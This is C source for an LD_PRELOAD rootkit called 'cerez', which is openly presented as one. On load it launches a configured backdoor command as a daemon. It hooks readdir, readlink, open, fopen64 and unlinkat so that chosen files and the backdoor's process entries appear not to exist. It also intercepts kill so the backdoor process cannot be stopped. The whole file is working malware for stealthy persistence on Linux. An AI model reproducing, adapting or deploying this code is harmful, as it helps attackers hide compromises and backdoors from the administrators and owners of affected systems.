/*
 * cerez | a ld_preload rootkit
 * ==================================
 * this project is licensed under GNU 
 * Public License Version 3 (GPLv3),
 * please see the LICENSE.txt 
 *
 * written by ngn - https://ngn.tf
*/

// standart libaries
#include <dirent.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>          
#include <sys/stat.h>
#include <stdarg.h>

#include "config.h"
#include "util.h"

// holds the proc struct 
// for the backdoor
struct proc backdoor;
struct Config cfg;

void _init() {
  debug("hello from init!");
  cfg.backdoor = "NONE";

  // get the original hooked calls
  oopen = (int (*)(const char* restrict, int, ...))find_addr("open");
  okill = (int (*)(pid_t, int))find_addr("kill");
  oreaddir = (struct dirent* (*)(DIR *))find_addr("readdir");
  oreadlink = (ssize_t (*)(const char *restrict, char *restrict, size_t))find_addr("readlink");
  ounlinkat = (int (*)(int, const char*, int))find_addr("unlinkat");  
  ofopen = (FILE* (*)(const char *restrict, const char *restrict mode))find_addr("fopen64");

  // init and read the config, if fails then return
  if (init_cfg(&cfg) == -1){
    return;
  }

  if (read_cfg(&cfg) == -1){
    clean_cfg(&cfg);
    return;
  }
 
  // we need to make sure that our 
  // backdoor is not already running
  // if so we can start it up
  backdoor = find_proc(cfg.backdoor);
  if(backdoor.alive){
		return;
  }
	
  // to start the backdoor first fork the current
  // process creating a new child process
  pid_t fpid = fork();
	
  // if pid is set to -1 it means child
  // process creation failed
  if (fpid == 0){	

    // if not failed, first we create a
    // daemon, 0 means child process should
    // change dir to root dir, the other 0 means 
    // child processes std in/out will be redirected to /dev/null
    daemon(0,0);

    // then we execute the backdoor
    system(cfg.backdoor);

    // then we just exit
    exit(0);  

  }

  return;
}

bool path_check(const char* pathname){
  debug("running path check");

  // if no config then we fine
  if(strcmp(cfg.backdoor, "NONE")==0){
    return true;
  }

  // check if its a hidden file
  for (int i = 0; i < cfg.hidden_count;  i++){
    if(strstr((char *)cfg.hidden[i], pathname)){
      debug("check failed - hidden file");
      return false;
    }
  }

  // check if its the backdoor process files
  if (!backdoor.alive){
    return true;
  }

  for (int i = 0; i < backdoor.pid_count; i++){
    char pid[30];	
    sprintf(pid, "%d", backdoor.pid[i]);

    if(strstr(pathname, pid)){
      debug("check failed - process file");
      return false;
    }
  }

  return true;
}

// malicious syscalls
struct dirent *readdir(DIR *dirp){
  debug("readdir called!");

  struct dirent *dp = oreaddir(dirp);	
  while(dp != NULL && (!path_check(dp->d_name))){ 
    dp = oreaddir(dirp);
  }

  return dp;
}

ssize_t readlink(const char *restrict pathname, char *restrict buf, size_t bufsiz){
  debug("readlink called!");
  if(!path_check(pathname)){
    errno = ENOENT;
    return -1;
  }
	
  return oreadlink(pathname, buf, bufsiz);
}


FILE* fopen64(const char *restrict pathname, const char *restrict mode){
  debug("fopen64 called!");
  if(!path_check(pathname)){
		errno = ENOENT;
    return NULL;
  }

  return ofopen(pathname, mode);	
}

int open(const char *pathname, int flags, ...){
  debug("open called!");
	if(!path_check(pathname)){
    errno = ENOENT;
    return -1;
  }

  va_list modes;
  va_start(modes, flags);
  return oopen(pathname, flags, modes);
  va_end(modes);
}

int unlinkat(int dirfd, const char *pathname, int flags){
  debug("unlinkat called!");
  if(!path_check(pathname)) {
    errno = ENOENT;
    return -1;
  }

  return ounlinkat(dirfd, pathname, flags);
}

int kill(pid_t pid, int sig){
  debug("kill called!");
  // here it checks if someone is trying to 
  // kill the backdoor, if thats the case,
  // then we return ESRCH, indicating that the 
  // process does not exists, even tho it does 

  // so even if you somehow find the backdoor PID 
  // you cannot kill it easily
  if(!backdoor.alive){
    return okill(pid, sig);
  } 
  
  for(int i = 0; i< backdoor.pid_count; i++){
    if (pid == backdoor.pid[i]){
      errno = ESRCH;
      return -1;
    }
  }

  return okill(pid, sig);
}
